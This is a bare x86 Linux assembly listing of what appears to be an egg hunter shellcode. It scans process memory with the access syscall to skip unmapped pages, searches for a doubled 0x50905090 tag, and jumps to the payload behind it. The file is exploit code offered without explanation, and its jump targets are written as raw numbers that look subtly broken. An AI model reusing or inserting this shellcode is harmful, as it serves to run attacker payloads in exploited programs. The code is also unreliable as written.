section .text
        global _start

_start:
        xor edx, edx
        or dx, 0xfff
        inc edx
        lea ebx, [edx+0x4]
        push byte 0x21
        pop eax
        int 0x80
        cmp al, 0x2f
        jz 0x2
        mov eax, 0x50905090
        mov edi, edx
        scasd
        jnz 0x7
        scasd
        jnz 0x7
        jmp edi

